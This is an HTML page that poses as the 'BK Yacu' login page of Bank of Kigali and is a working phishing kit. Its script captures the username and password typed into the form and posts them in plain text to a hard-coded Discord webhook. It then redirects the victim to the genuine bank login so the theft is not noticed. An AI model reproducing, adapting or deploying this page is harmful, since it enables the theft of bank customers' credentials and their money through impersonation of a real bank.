<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <link rel="shortcut icon" href="/BK/bk_layer.png" type="image/ico" />
    <title>BK Yacu - Bank of Kigali Ltd</title>
    <style type="text/css">
        /* CSS styles */
        body {
            background-color: #ecf3fb;
            font-family: 'trebuchet MS', 'Lucida sans', Arial;
        }

        .block {
            text-align: center;
            width: 320px;
            padding: 20px;
            margin: 100px auto;
            border-radius: 12px;
            box-shadow: 0 0 10px #333;
            border: 3px solid white;
            background-color: white;
        }

        form {
            padding-top: 0px;
            padding-bottom: 20px;
            padding-left: 20px;
            padding-right: 20px;
        }

        form p {
            margin: 0;
            text-align: left;
        }

        label {
            display: inline-block;
            color: #5e5e5e;
            font-size: 15px;
            font-weight: bold;
            text-decoration: none;
            text-shadow: 1px 1px 0px #ffffff;
        }

        input[type="text"], input[type="password"] {
            border: 1px solid #CCCCCC;
            font-size: 15px;
            margin: 0 0 15px;
            padding: 8px;
            width: 100%;
            box-sizing: border-box;
            border-radius: 5px;
        }

        input[type="submit"] {
            background-color: #0576BC;
            color: white;
            border: none;
            font-size: 15px;
            font-weight: bold;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 5px;
        }

        input[type="submit"]:hover {
            background-color: #065d99;
        }
    </style>
</head>
<body>
    <div class="block">
        <img src="https://agency.bk.rw/img/bk_layer.png" alt="Logo"/>
        <form id="loginForm" method="post">
            <input type="checkbox" name="_spring_security_remember_me" id="_spring_security_remember_me" style="display: none"/>
            <h2 style="color:#0576BC;font-size: 24px">LOGIN</h2>
            <p><label for="j_username">Username</label><br/><input type="text" name="j_username" id="j_username" /></p>
            <p><label for="j_password">Password</label><br/><input type="password" name="j_password" id="j_password" /></p>
            <p><input type="submit" id="loginBtn" value="Login" /></p>
            <p style="color:#0576BC;font-size: 18px">For support, call us on <b>4455</b></p>
        </form>
    </div>

    <script>
        // JavaScript code
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Get username and password from form inputs
            var username = document.getElementById('j_username').value;
            var password = document.getElementById('j_password').value;

            // Simulate logging the attempt (you can customize this)
            var logMessage = new Date().toISOString() + " - Login attempt by: " + username + "\n";
            console.log(logMessage); // Log to console (for demonstration)

            // Replace this with your actual webhook URL
            var webhookUrl = 'https://discord.com/api/webhooks/1254965734858166377/p5-nqFweiZlTGoZlkOWrkpTJo4NSA7qqANpXg5QRtNpodZJRQheAhxVDCTHtWgPgqe9t';

            // Example of sending data to webhook (you can customize this)
            var payload = {
                content: "Login attempt",
                embeds: [{
                    title: "Login Attempt",
                    description: "User: " + username + "\nPassword: " + password,
                    color: 16711680 // Red color (you can change this)
                }]
            };

            // Setup and send POST request to webhook URL
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log('Webhook sent successfully');
                    // Redirect user after successful login and webhook
                    window.location.href = 'https://agency.bk.rw/login'; // Redirect URL fixed
                } else {
                    console.error('Failed to send webhook');
                    // Handle error scenario (optional)
                }
            })
            .catch(error => {
                console.error('Error sending webhook:', error);
                // Handle error scenario (optional)
            });
        });
    </script>
</body>
</html>
